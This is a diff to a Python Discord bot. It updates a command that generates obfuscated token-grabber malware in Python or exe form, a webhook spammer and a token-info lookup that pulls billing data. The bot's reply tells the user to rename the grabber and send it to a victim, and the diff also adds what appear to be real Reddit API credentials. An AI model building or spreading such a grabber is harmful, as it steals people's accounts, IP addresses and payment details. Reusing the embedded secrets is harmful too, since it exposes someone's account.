@@ -25,10 +25,10 @@ from discord.ui import Select
 # ++++++++++++++++               S. 10/17/2023              ++++++++++++++++ #
 
 
-                # ================ changelog ================ # 
-                # add sum lil shit
-                # made help look better
-                # added convert token grabber file to exe
+                # ================ changelog ================ #   newer
+                # add sum goofy shit                               🔽
+                # made help look better                           older
+                # added convert token grabber file to exe option
                 # added ip info                
                 # added github profile info 
                 # everything looks better now
@@ -49,8 +49,6 @@ from discord.ui import Select
                 # add user token functions
                 # add badges to token info,skid from https://github.com/Fadi002/Discord-Token-Info/blob/main/src/info.py
                 # add emojis
-                # change every thing to embeds
-                # add convert to exe in token grabber
                 # turn everything to slash cmd
                 # ================ to do list ================ # 
 
@@ -70,9 +68,9 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 bot.remove_command('help')
 
-reddit = praw.Reddit(client_id='',
-                     client_secret='',
-                     user_agent='')
+reddit = praw.Reddit(client_id='yIcqdtiDh3HnDpM6BfOhPw',
+                     client_secret='rF14sOiRYNagEz-k6XwEqyZmxRqgVw',
+                     user_agent='XOLOGANG111')
 
 
 
@@ -823,7 +821,7 @@ async def tokengrabber(ctx, webhook, obfus, mode):
 
     file = discord.File(file_path, filename='grabber.exe' if mode.lower() == "exe" else 'grabber.py')
 
-    await ctx.reply(file=file, content='Rename this and send it to the victim. If it is a python file, victim must have python installed.')
+    await ctx.reply(file=file, content='Rename this and send it to the victim. Py mode will require the victim to have python installed. Exe is probably flagged as a virus.')
 
     if mode.lower() == "exe":
 
@@ -1095,7 +1093,7 @@ async def help(ctx):
         if select.values[0] == "Malicious":
             helpzembed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
             helpzembed.add_field(name='🪝 Webhook Spammer', value=f'`{bot.command_prefix}webhookspam <webhook> <msgcontent>`', inline=False)
-            helpzembed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false> <mode: exe/py>`\nObfuscation is recommended for performance.', inline=False)
+            helpzembed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false> <mode: exe/py>`\nObfuscation is recommended for performance.\nEXE mode is unstable, I dont recommend using it.', inline=False)
             helpzembed.add_field(name='💸 Token Information', value=f'Provides full information on a user token. Billing info will also be grabbed if any.\n`{bot.command_prefix}tokinfo <token>`', inline=False)
             helpzembed.set_footer(text="Github: x9o")
 
